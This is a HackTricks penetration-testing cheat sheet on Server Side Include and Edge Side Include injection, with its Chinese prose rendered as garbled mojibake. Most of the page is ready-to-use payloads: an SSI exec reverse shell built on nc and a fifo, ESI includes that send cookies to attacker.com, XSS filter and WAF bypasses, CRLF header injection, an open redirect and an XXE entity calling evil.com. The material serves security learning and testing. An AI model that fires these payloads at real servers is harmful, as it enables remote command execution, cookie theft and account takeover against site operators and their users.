# æœåŠ¡å™¨ç«¯åŒ…å«/è¾¹ç¼˜ç«¯åŒ…å«æ³¨å…¥

<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œå‚åŠ </strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWSçº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## æœåŠ¡å™¨ç«¯åŒ…å«åŸºç¡€ä¿¡æ¯

SSIï¼ˆæœåŠ¡å™¨ç«¯åŒ…å«ï¼‰æ˜¯**æ”¾ç½®åœ¨HTMLé¡µé¢ä¸­ï¼Œåœ¨æœåŠ¡å™¨ä¸Šè¯„ä¼°**çš„æŒ‡ä»¤ï¼Œå½“é¡µé¢è¢«æä¾›æœåŠ¡æ—¶ã€‚å®ƒä»¬è®©ä½ **å‘ç°æœ‰HTMLé¡µé¢æ·»åŠ åŠ¨æ€ç”Ÿæˆçš„å†…å®¹**ï¼Œè€Œæ— éœ€é€šè¿‡CGIç¨‹åºæˆ–å…¶ä»–åŠ¨æ€æŠ€æœ¯æ¥æä¾›æ•´ä¸ªé¡µé¢ã€‚\
ä¾‹å¦‚ï¼Œä½ å¯èƒ½ä¼šåœ¨ç°æœ‰çš„HTMLé¡µé¢ä¸­æ”¾ç½®ä¸€ä¸ªæŒ‡ä»¤ï¼Œå¦‚ï¼š

`<!--#echo var="DATE_LOCAL" -->`

å½“é¡µé¢è¢«æä¾›æœåŠ¡æ—¶ï¼Œè¿™ä¸ªç‰‡æ®µå°†è¢«è¯„ä¼°å¹¶æ›¿æ¢ä¸ºå®ƒçš„å€¼ï¼š

`Tuesday, 15-Jan-2013 19:28:54 EST`

å†³å®šä½•æ—¶ä½¿ç”¨SSIï¼Œä½•æ—¶è®©æ‚¨çš„é¡µé¢å®Œå…¨ç”±æŸä¸ªç¨‹åºç”Ÿæˆï¼Œé€šå¸¸æ˜¯ä¸€ä¸ªå…³äºé¡µé¢æœ‰å¤šå°‘æ˜¯é™æ€çš„ï¼Œä»¥åŠæ¯æ¬¡æä¾›æœåŠ¡æ—¶éœ€è¦é‡æ–°è®¡ç®—å¤šå°‘çš„é—®é¢˜ã€‚SSIæ˜¯æ·»åŠ å°ä¿¡æ¯ç‰‡æ®µçš„å¥½æ–¹æ³•ï¼Œæ¯”å¦‚ä¸Šé¢æ˜¾ç¤ºçš„å½“å‰æ—¶é—´ã€‚ä½†æ˜¯å¦‚æœæ‚¨çš„é¡µé¢çš„å¤§éƒ¨åˆ†åœ¨æä¾›æœåŠ¡æ—¶è¢«ç”Ÿæˆï¼Œæ‚¨éœ€è¦å¯»æ‰¾å…¶ä»–è§£å†³æ–¹æ¡ˆã€‚ï¼ˆå®šä¹‰å–è‡ª[è¿™é‡Œ](https://httpd.apache.org/docs/current/howto/ssi.html)ï¼‰ã€‚

å¦‚æœWebåº”ç”¨ç¨‹åºä½¿ç”¨æ‰©å±•åä¸º\*\* `.shtml`ã€`.shtm` æˆ– `.stm`\*\*çš„æ–‡ä»¶ï¼Œæ‚¨å¯ä»¥æ¨æ–­å‡ºSSIçš„å­˜åœ¨ï¼Œä½†è¿™å¹¶ä¸æ˜¯å”¯ä¸€çš„æƒ…å†µã€‚

å…¸å‹çš„SSIè¡¨è¾¾å¼æ ¼å¼å¦‚ä¸‹ï¼š
```
<!--#directive param="value" -->
```
### æ£€æŸ¥
```javascript
// Document name
<!--#echo var="DOCUMENT_NAME" -->
// Date
<!--#echo var="DATE_LOCAL" -->

// File inclusion
<!--#include virtual="/index.html" -->
// Including files (same directory)
<!--#include file="file_to_include.html" -->
// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->
// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->
// Modification date of a file
<!--#flastmod file="index.html" -->

// Command exec
<!--#exec cmd="dir" -->
// Command exec
<!--#exec cmd="ls" -->
// Reverse shell
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->

// Print all variables
<!--#printenv -->
// Setting variables
<!--#set var="name" value="Rich" -->

```
## è¾¹ç¼˜ç«¯åŒ…å«ï¼ˆEdge Side Inclusionï¼‰

ç¼“å­˜ä¿¡æ¯æˆ–åŠ¨æ€åº”ç”¨ç¨‹åºå­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œå› ä¸ºéƒ¨åˆ†å†…å®¹åœ¨ä¸‹æ¬¡æ£€ç´¢æ—¶å¯èƒ½ä¼š**å˜åŒ–**ã€‚è¿™å°±æ˜¯**ESI**çš„ç”¨é€”ï¼Œé€šè¿‡ä½¿ç”¨ESIæ ‡ç­¾æ¥æŒ‡ç¤º**éœ€è¦ç”Ÿæˆçš„åŠ¨æ€å†…å®¹**ï¼Œç„¶åå†å‘é€ç¼“å­˜ç‰ˆæœ¬ã€‚\
å¦‚æœ**æ”»å‡»è€…**èƒ½å¤Ÿåœ¨ç¼“å­˜å†…å®¹ä¸­**æ³¨å…¥ä¸€ä¸ªESIæ ‡ç­¾**ï¼Œé‚£ä¹ˆä»–å°±èƒ½å¤Ÿåœ¨æ–‡æ¡£å‘é€ç»™ç”¨æˆ·ä¹‹å‰**æ³¨å…¥ä»»æ„å†…å®¹**ã€‚

### ESI æ£€æµ‹

ä»¥ä¸‹**å“åº”å¤´**è¡¨æ˜æœåŠ¡å™¨æ­£åœ¨ä½¿ç”¨ESIï¼š
```
Surrogate-Control: content="ESI/1.0"
```
å¦‚æœæ‰¾ä¸åˆ°è¿™ä¸ªå¤´éƒ¨ï¼ŒæœåŠ¡å™¨**å¯èƒ½ä»åœ¨ä½¿ç”¨ESI**ã€‚\
**ç›²ç›®åˆ©ç”¨æ–¹æ³•ä¹Ÿå¯ä»¥ä½¿ç”¨**ï¼Œå› ä¸ºè¯·æ±‚åº”è¯¥ä¼šåˆ°è¾¾æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼š
```javascript
// Basic detection
hell<!--esi-->o
// If previous is reflected as "hello", it's vulnerable

// Blind detection
<esi:include src=http://attacker.com>

// XSS Exploitation Example
<esi:include src=http://attacker.com/XSSPAYLOAD.html>

// Cookie Stealer (bypass httpOnly flag)
<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```
### ESI æ¼æ´åˆ©ç”¨

[GoSecure](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/) åˆ›å»ºäº†ä¸€ä¸ªè¡¨æ ¼ï¼Œå¸®åŠ©æˆ‘ä»¬ç†è§£é’ˆå¯¹ä¸åŒæ”¯æŒ ESI çš„è½¯ä»¶ï¼Œæ ¹æ®å…¶æ”¯æŒçš„åŠŸèƒ½ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•çš„å¯èƒ½æ”»å‡»ã€‚é¦–å…ˆï¼Œè®©æˆ‘ä»¬è§£é‡Šä¸€ä¸‹ä¸‹è¡¨åˆ—åçš„å«ä¹‰ï¼š

* **Includes**: æ”¯æŒ `<esi:includes>` æŒ‡ä»¤
* **Vars**: æ”¯æŒ `<esi:vars>` æŒ‡ä»¤ã€‚ç”¨äºç»•è¿‡ XSS è¿‡æ»¤å™¨
* **Cookie**: æ–‡æ¡£ cookies å¯ä»¥è¢« ESI å¼•æ“è®¿é—®
* **Upstream Headers Required**: ä»£ç†åº”ç”¨ç¨‹åºä¸ä¼šå¤„ç† ESI è¯­å¥ï¼Œé™¤éä¸Šæ¸¸åº”ç”¨ç¨‹åºæä¾›äº†å¤´éƒ¨ä¿¡æ¯
* **Host Allowlist**: åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œåªèƒ½ä»å…è®¸çš„æœåŠ¡å™¨ä¸»æœºè¿›è¡Œ ESI åŒ…å«ï¼Œä¾‹å¦‚ï¼ŒSSRF åªèƒ½é’ˆå¯¹è¿™äº›ä¸»æœºè¿›è¡Œ

|         **è½¯ä»¶**         | **Includes** | **Vars** | **Cookies** | **Upstream Headers Required** | **Host Whitelist** |
| :----------------------: | :----------: | :------: | :---------: | :---------------------------: | :----------------: |
|            Squid3            |      æ˜¯     |    æ˜¯   |     æ˜¯     |              æ˜¯              |         å¦         |
|         Varnish Cache        |      æ˜¯     |    å¦    |      å¦     |              æ˜¯              |         æ˜¯        |
|            Fastly            |      æ˜¯     |    å¦    |      å¦     |               å¦              |         æ˜¯        |
| Akamai ESI Test Server (ETS) |      æ˜¯     |    æ˜¯   |     æ˜¯     |               å¦              |         å¦         |
|          NodeJS esi          |      æ˜¯     |    æ˜¯   |     æ˜¯     |               å¦              |         å¦         |
|         NodeJS nodesi        |      æ˜¯     |    å¦    |      å¦     |               å¦              |      å¯é€‰      |

#### XSS

ä»¥ä¸‹ ESI æŒ‡ä»¤å°†åœ¨æœåŠ¡å™¨çš„å“åº”ä¸­åŠ è½½ä»»æ„æ–‡ä»¶
```markup
<esi:include src=http://attacker.com/xss.html>
```
æ–‡ä»¶ _http://attacker.com/xss.html_ å¯èƒ½åŒ…å«åƒ `<script>alert(1)</script>` è¿™æ ·çš„XSSè½½è·

#### ç»•è¿‡å®¢æˆ·ç«¯XSSä¿æŠ¤
```markup
x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>

Use <!--esi--> to bypass WAFs:
<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>
<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>
```
#### å·å– Cookie

* è¿œç¨‹å·å– cookie
```markup
<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />
```
* é€šè¿‡åœ¨å“åº”ä¸­åå°„æ¥çªƒå–å¸¦æœ‰ XSS çš„ HTTP\_ONLY cookieï¼š
```bash
# This will reflect the cookies in the response
<!--esi $(HTTP_COOKIE) -->
# Reflect XSS
<!--esi/$url_decode('"><svg/onload=prompt(1)>')/-->
```
* é€šè¿‡åå°„ cookies å®ç°å®Œå…¨è´¦æˆ·æ¥ç®¡

#### ç§æœ‰æœ¬åœ°æ–‡ä»¶

ä¸è¦å°†æ­¤ä¸â€œæœ¬åœ°æ–‡ä»¶åŒ…å«â€æ··æ·†ï¼š
```markup
<esi:include src="secret.txt">
```
#### CRLF
```markup
<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
```
#### å¼€æ”¾é‡å®šå‘

ä»¥ä¸‹æ“ä½œå°†åœ¨å“åº”ä¸­æ·»åŠ ä¸€ä¸ª `Location` å¤´
```bash
<!--esi $add_header('Location','http://attacker.com') -->
```
#### æ·»åŠ å¤´éƒ¨

* åœ¨å¼ºåˆ¶è¯·æ±‚ä¸­æ·»åŠ å¤´éƒ¨
```html
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345"/>
</esi:include>
```
* åœ¨å“åº”ä¸­æ·»åŠ å¤´éƒ¨ï¼ˆç”¨äºç»•è¿‡å¸¦æœ‰XSSçš„å“åº”ä¸­çš„"Content-Type: text/json"ï¼‰
```bash
<!--esi/$add_header('Content-Type','text/html')/-->

<!--esi/$(HTTP_COOKIE)/$add_header('Content-Type','text/html')/$url_decode($url_decode('"><svg/onload=prompt(1)>'))/-->
```
#### åœ¨æ·»åŠ å¤´éƒ¨ä¸­çš„CRLFï¼ˆ**CVE-2019-2438)**
```markup
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345
Host: anotherhost.com"/>
</esi:include>
```
#### Akamai è°ƒè¯•

è¿™å°†å‘é€å“åº”ä¸­åŒ…å«çš„è°ƒè¯•ä¿¡æ¯ï¼š
```markup
<esi:debug/>
```
### ESI + XSLT = XXE

ä¹Ÿå¯ä»¥é€šè¿‡æŒ‡å®š `xslt` å€¼ç»™ _dca_ å‚æ•°ï¼Œæ·»åŠ åŸºäº\*\* **\_**å¯æ‰©å±•æ ·å¼è¡¨è¯­è¨€è½¬æ¢ (XSLT)**\_** \*\*çš„ ESI åŒ…å«ã€‚ä»¥ä¸‹åŒ…å«å°†å¯¼è‡´HTTPä»£ç†è¯·æ±‚XMLå’ŒXSLTæ–‡ä»¶ã€‚ç„¶åä½¿ç”¨XSLTæ–‡ä»¶è¿‡æ»¤XMLæ–‡ä»¶ã€‚è¿™ä¸ªXMLæ–‡ä»¶å¯ä»¥ç”¨æ¥æ‰§è¡Œ _XMLå¤–éƒ¨å®ä½“ (XXE)_ æ”»å‡»ã€‚è¿™å…è®¸æ”»å‡»è€…æ‰§è¡ŒSSRFæ”»å‡»ï¼Œè¿™å¹¶ä¸æ˜¯éå¸¸æœ‰ç”¨ï¼Œå› ä¸ºè¿™å¿…é¡»é€šè¿‡ESIåŒ…å«æ¥æ‰§è¡Œï¼Œè€ŒESIåŒ…å«æœ¬èº«å°±æ˜¯ä¸€ä¸ªSSRFå‘é‡ã€‚ç”±äºåº•å±‚åº“ï¼ˆXalanï¼‰ä¸æ”¯æŒå¤–éƒ¨DTDï¼Œå› æ­¤ä¸è§£æå¤–éƒ¨DTDã€‚è¿™æ„å‘³ç€æˆ‘ä»¬æ— æ³•æå–æœ¬åœ°æ–‡ä»¶ã€‚
```markup
<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
```
XSLTæ–‡ä»¶ï¼š
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file" >]>
<foo>&xxe;</foo>
```
æ£€æŸ¥XSLTé¡µé¢ï¼š

{% content-ref url="xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

### å‚è€ƒèµ„æ–™

* [https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
* [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
* [https://academy.hackthebox.com/module/145/section/1304](https://academy.hackthebox.com/module/145/section/1304)
* [https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91](https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91)

## æš´åŠ›ç ´è§£æ£€æµ‹åˆ—è¡¨

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt" %}

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹çš„PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
